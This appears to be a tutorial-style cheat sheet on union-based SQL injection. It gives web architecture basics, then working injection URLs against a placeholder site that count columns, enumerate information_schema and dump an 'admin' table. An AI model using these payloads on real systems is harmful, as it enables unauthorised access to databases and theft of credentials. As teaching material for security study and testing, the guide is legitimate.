# SQL Injection Basic To Advanced

## 1. Introduciton
**Web Architecture**
![Web Architecture](https://axisbits.com/storage/app/uploads/public/7da/cc4/ec1/7dacc4ec1c9bc16b7aa58185cb8efa5a.png "Web Architecture")
<br>
**Client Side**
```
HTML
CSS 
JavaScript
```
**Server Side**
```
PHP
ASP
Python
Ruby on Rails
Node JS 
SQL
```
**Database Management Systems**
```
MySQL
PostgreSQL
Oracle SQL
```
> Web Protocols
![Web Architecture](https://static.javatpoint.com/tutorial/computer-network/images/http-vs-https.png "Protocols")

##

> URL(Uniform Resource Locator) Structure
![Web Architecture](https://static.semrush.com/blog/uploads/media/fa/fe/fafe931ac85fc1c5b628299e399a2870/yqyhmdwqsDzxONy4U6FyLwK_LN_hl36xIGyfon2xWiopIuhrhR4w08c-NbWe2EnJXUh0RWDOCtMrlVNhqlBVmWRjKI3freLX4X_1Ugk7_9FwqgquwBsNqfaOnJZQ6xJJnGRKowrKhSBr_xVQZGI6gCg.png "URL")



##

## General Process:
- Find injection point  
- Understand the website behaviour  
- Hunting SQL Errors
- Identify Attack Types
- Injections And Bypass Process
- Dump Data

## SQL Error Hunting Types
- String Based
- Integer Based

## Types Of SQL Injection Attacks
- Union Based SQL Injection Attacks
- Error Based Injection Attacks
- Blind SQL Injections (Bollean Based And Time Based)

![SQL Injection](https://media.geeksforgeeks.org/wp-content/uploads/20220716180638/types.PNG)

# Union Based SQL Injection

## General Process:
- Find Column Count
- Using UNION Operator To Add Malicious Statement
- Gather Database And DBMS Informations
- Finding Tables
- Finding Columns Of Table Or Tables
- Dump Data


**Finding Column Count**
```
https://vuln-web.vuln/product.php?id=1' ORDER BY 1-- -

https://vuln-web.vuln/product.php?id=1' GROUP BY 1-- -

https://vuln-web.vuln/product.php?id=1' ORDER BY 1 ASC-- -

https://vuln-web.vuln/product.php?id=1' GROUP BY 1 DESC-- -
```

**Using UNION Operator To Add Malicious Statement**

```
https://vuln-web.vuln/product.php?id=1' UNION SELECT 1,2,3,4,5-- -
https://vuln-web.vuln/product.php?id=1' UNION+ALL+SELECT+null,null,null,null,null-- -
https://vuln-web.vuln/product.php?id=1' UNION(SELECT(1),(2),(3),(4),(5))-- -
https://vuln-web.vuln/product.php?id=1' UNION SELECT CHAR(1),CHAR(2),CHAR(3),CHAR(4),CHAR(5)-- -
https://vuln-web.vuln/product.php?id=1' UNION SELECT * FROM (SELECT 1)a JOIN(SELECT 2)b JOIN(SELECT 3)c JOIN(SELECT 4)d JOIN(SELECT 5)e-- -
https://vuln-web.vuln/product.php?id=1' UNION Distinctrow SELECT 1,2,3,4,5-- -
```

## Understanding MYSQL DBMS Structures

```
MYSQL DBMS -> USER -> DATABASE -> TABLES -> ROWS -> Data
```
**information_schema Database**
```
provides access to database metadata, information about the MySQL server such as the name of a database or table, the data type of a column, or access privileges.
```

**Gather Database And DBMS Informations**

```
https://vuln-web.vuln/product.php?id=1' UNION SELECT 1,2,(SELECT database()),4,5-- -
https://vuln-web.vuln/product.php?id=1' UNION SELECT 1,2,(SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata),4,5-- -
https://vuln-web.vuln/product.php?id=1' UNION SELECT 1,2,(SELECT version()),4,5-- -
https://vuln-web.vuln/product.php?id=1' UNION SELECT 1,2,(SELECT user()),4,5-- -
https://vuln-web.vuln/product.php?id=1' UNION SELECT 1,2,(SELECT @@datadir),4,5-- -
```

**Finding Tables**
```
https://vuln-web.vuln/product.php?id=1' UNION SELECT 1,2,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()),4,5-- -
```

**Finding Columns Of Table Or Tables**

```
https://vuln-web.vuln/product.php?id=1' UNION SELECT 1,2,(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema=database() and table_name='admin'),4,5-- -
https://vuln-web.vuln/product.php?id=1' UNION SELECT 1,2,(SELECT GROUP_CONCAT(table_name,':',column_name) FROM information_schema.columns WHERE table_schema=database()),4,5-- -
```

**Dump Data**

```
https://vuln-web.vuln/product.php?id=1' UNION SELECT 1,2,(SELECT GROUP_CONCAT(column1,':',column2) FROM admin),4,5-- -
```
